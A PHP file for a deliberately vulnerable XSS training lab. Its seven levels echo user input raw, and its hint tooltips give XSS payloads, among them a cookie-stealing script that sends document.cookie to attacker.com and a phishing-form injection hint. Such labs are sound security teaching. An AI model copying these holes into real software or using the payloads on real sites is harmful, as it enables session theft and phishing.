<?php
// =============================================
// FAHZX XSS LAB v1.0 - Deliberately Vulnerable
// NO sanitization, NO filtering, RAW output
// For practice only, bro. Use responsibly.
// =============================================

session_start();

// Stored XSS - simpan komentar ke "database" (file txt)
if (isset($_POST['comment'])) {
    $comment = $_POST['comment']; // NO SANITIZATION AT ALL
    file_put_contents('comments.txt', $comment . "\n---\n", FILE_APPEND);
}

// Stored XSS - hapus semua komentar
if (isset($_POST['clear'])) {
    file_put_contents('comments.txt', '');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FAHZX XSS LAB - Vulnerable Web App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            color: #e0e0e0;
            font-family: 'Segoe UI', Consolas, monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            padding: 30px;
            border-bottom: 2px solid #1a1a1a;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #ff4444;
            font-size: 2.5em;
            letter-spacing: 3px;
            text-shadow: 0 0 15px rgba(255,0,0,0.5);
        }
        .header p {
            color: #888;
            margin-top: 10px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .lab-section {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 25px;
        }
        .lab-section h2 {
            color: #ff6666;
            margin-bottom: 15px;
            font-size: 1.4em;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .difficulty {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.7em;
            font-weight: bold;
            margin-left: 10px;
        }
        .easy {
            background: #1b5e20;
            color: #66bb6a;
        }
        .medium {
            background: #e65100;
            color: #ffab40;
        }
        .hard {
            background: #b71c1c;
            color: #ef5350;
        }
        input[type="text"], textarea, select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #0d0d0d;
            border: 1px solid #444;
            color: #e0e0e0;
            font-family: Consolas, monospace;
            font-size: 14px;
            border-radius: 4px;
            outline: none;
        }
        input[type="text"]:focus, textarea:focus {
            border-color: #ff4444;
            box-shadow: 0 0 10px rgba(255,0,0,0.2);
        }
        button {
            background: #ff4444;
            color: #fff;
            border: none;
            padding: 12px 25px;
            cursor: pointer;
            font-weight: bold;
            font-size: 14px;
            border-radius: 4px;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        button:hover {
            background: #ff2222;
            box-shadow: 0 0 15px rgba(255,0,0,0.4);
        }
        .output-box {
            background: #0d0d0d;
            border: 1px dashed #444;
            padding: 15px;
            margin-top: 10px;
            border-radius: 4px;
            min-height: 40px;
            word-break: break-all;
        }
        .comments-display {
            background: #0d0d0d;
            border: 1px solid #333;
            padding: 15px;
            margin-top: 10px;
            border-radius: 4px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .tooltip {
            color: #888;
            font-size: 0.8em;
            display: block;
            margin-top: -5px;
            margin-bottom: 10px;
        }
        .skull-icon {
            font-size: 4em;
            text-align: center;
            display: block;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }
        code {
            background: #2a2a2a;
            padding: 2px 6px;
            border-radius: 3px;
            color: #ff8888;
            font-size: 0.9em;
        }
    </style>
</head>
<body>

<div class="header">
    <span class="skull-icon">💀</span>
    <h1>FAHZX XSS LAB</h1>
    <p>Deliberately Vulnerable Web App • No Filters • No Sanitization • Pure Chaos</p>
    <p style="font-size: 0.8em; color: #ff4444;">⚠️ Gunakan untuk latihan di localhost saja ⚠️</p>
</div>

<div class="container">

    <!-- ==================== LEVEL 1: Reflected XSS (GET) ==================== -->
    <div class="lab-section">
        <h2>Level 1: Reflected XSS (GET Method) <span class="difficulty easy">EASY</span></h2>
        <p>Parameter <code>name</code> langsung ditampilkan tanpa filter. Coba inject lewat URL: <code>?name=test</code></p>
        <form method="GET">
            <input type="text" name="name" placeholder="Masukkan nama atau payload..." value="<?php echo isset($_GET['name']) ? $_GET['name'] : ''; ?>">
            <button type="submit">Submit</button>
        </form>
        <div class="output-box">
            <strong>Output:</strong> 
            <?php 
                if (isset($_GET['name'])) {
                    echo $_GET['name']; // RAW OUTPUT, NO FILTER
                } else {
                    echo "<span style='color:#666;'>Belum ada input</span>";
                }
            ?>
        </div>
        <span class="tooltip">💡 Hint: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></span>
    </div>

    <!-- ==================== LEVEL 2: Reflected XSS (POST) ==================== -->
    <div class="lab-section">
        <h2>Level 2: Reflected XSS (POST Method) <span class="difficulty easy">EASY</span></h2>
        <p>Search bar tanpa filter. Ketik apa aja, langsung diproses.</p>
        <form method="POST">
            <input type="text" name="search" placeholder="Search sesuatu...">
            <button type="submit">Search</button>
        </form>
        <div class="output-box">
            <strong>Hasil pencarian untuk:</strong> 
            <?php 
                if (isset($_POST['search'])) {
                    echo $_POST['search']; // RAW OUTPUT
                } else {
                    echo "<span style='color:#666;'>Ketik sesuatu dulu</span>";
                }
            ?>
        </div>
        <span class="tooltip">💡 Hint: <code>&lt;img src=x onerror=alert(1)&gt;</code></span>
    </div>

    <!-- ==================== LEVEL 3: Stored XSS ==================== -->
    <div class="lab-section">
        <h2>Level 3: Stored XSS (Comment Section) <span class="difficulty medium">MEDIUM</span></h2>
        <p>Komentar disimpan permanen di file <code>comments.txt</code>. Payload akan tereksekusi setiap kali halaman dibuka.</p>
        <form method="POST">
            <textarea name="comment" rows="4" placeholder="Tulis komentar atau payload XSS..."></textarea>
            <button type="submit" name="post_comment">Post Comment</button>
            <button type="submit" name="clear" style="background:#444;" onclick="return confirm('Hapus semua komentar?')">Clear All</button>
        </form>
        <div class="comments-display">
            <strong>Komentar (Stored):</strong><br>
            <?php 
                if (file_exists('comments.txt') && filesize('comments.txt') > 0) {
                    $comments = file_get_contents('comments.txt');
                    echo $comments; // RAW OUTPUT, STORED XSS
                } else {
                    echo "<span style='color:#666;'>Belum ada komentar. Jadi yang pertama!</span>";
                }
            ?>
        </div>
        <span class="tooltip">💡 Hint: <code>&lt;script&gt;document.cookie&lt;/script&gt;</code> atau <code>&lt;svg/onload=alert('stored')&gt;</code></span>
    </div>

    <!-- ==================== LEVEL 4: DOM-Based XSS ==================== -->
    <div class="lab-section">
        <h2>Level 4: DOM-Based XSS <span class="difficulty medium">MEDIUM</span></h2>
        <p>Input diambil dari hash URL (fragment) dan dimasukkan ke DOM via JavaScript. <code>#payload</code></p>
        <div id="dom-output" class="output-box">
            <strong>Output:</strong> <span style='color:#666;'>Coba tambahkan # sesuatu di URL</span>
        </div>
        <span class="tooltip">💡 Hint: <code>#&lt;img src=x onerror=alert('DOM XSS')&gt;</code></span>
    </div>

    <!-- ==================== LEVEL 5: HTML Injection ==================== -->
    <div class="lab-section">
        <h2>Level 5: HTML Injection <span class="difficulty easy">EASY</span></h2>
        <p>Custom profile bio yang menerima HTML mentah. Bisa inject form, iframe, atau apa aja.</p>
        <form method="POST">
            <textarea name="bio" rows="3" placeholder="Tulis bio HTML kamu..."></textarea>
            <button type="submit">Update Bio</button>
        </form>
        <div class="output-box">
            <strong>Bio:</strong><br>
            <?php 
                if (isset($_POST['bio'])) {
                    echo $_POST['bio']; // RAW HTML
                } else {
                    echo "<span style='color:#666;'>Bio kosong</span>";
                }
            ?>
        </div>
        <span class="tooltip">💡 Hint: <code>&lt;form&gt;&lt;input type='text'&gt;&lt;/form&gt;</code> buat phishing simpel</span>
    </div>

    <!-- ==================== LEVEL 6: Cookie Stealer Demo ==================== -->
    <div class="lab-section">
        <h2>Level 6: Cookie Viewer (Buat Latihan Steal) <span class="difficulty easy">EASY</span></h2>
        <p>Ini nunjukin cookie yang aktif. Gunakan payload XSS dari level lain untuk nyolong ini.</p>
        <div class="output-box">
            <strong>Current Cookies:</strong><br>
            <code><?php echo htmlspecialchars($_SERVER['HTTP_COOKIE'] ?? 'No cookies set'); ?></code>
        </div>
        <span class="tooltip">💡 Payload: <code>&lt;script&gt;new Image().src='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></span>
    </div>

    <!-- ==================== LEVEL 7: User-Agent XSS ==================== -->
    <div class="lab-section">
        <h2>Level 7: User-Agent Reflection <span class="difficulty hard">HARD</span></h2>
        <p>User-Agent kamu direfleksikan langsung. Bisa dimanipulasi pake tool kayak Burp Suite atau curl.</p>
        <div class="output-box">
            <strong>Your User-Agent:</strong><br>
            <?php echo $_SERVER['HTTP_USER_AGENT']; // RAW USER AGENT ?>
        </div>
        <span class="tooltip">💡 Hint: <code>curl -A '&lt;script&gt;alert(1)&lt;/script&gt;' http://localhost:8080/xss_lab.php</code></span>
    </div>

</div>

<!-- ==================== DOM-BASED XSS JAVASCRIPT ==================== -->
<script>
    // Level 4: DOM-Based XSS - takes hash from URL, injects directly into DOM
    // NO SANITIZATION, raw innerHTML
    function injectHash() {
        var hash = window.location.hash.substring(1); // Remove the #
        var outputDiv = document.getElementById('dom-output');
        if (hash) {
            outputDiv.innerHTML = '<strong>Output:</strong> ' + hash; // VULNERABLE innerHTML
        }
    }
    window.addEventListener('hashchange', injectHash);
    window.addEventListener('load', injectHash);

    // Cookie demo - set some fake cookies for practice
    document.cookie = "session_id=abc123_fahzx_demo; path=/";
    document.cookie = "user_token=eyJhbGciOiJIUzI1NiJ9_fake; path=/";
    document.cookie = "admin=false; path=/";
</script>

</body>
</html>
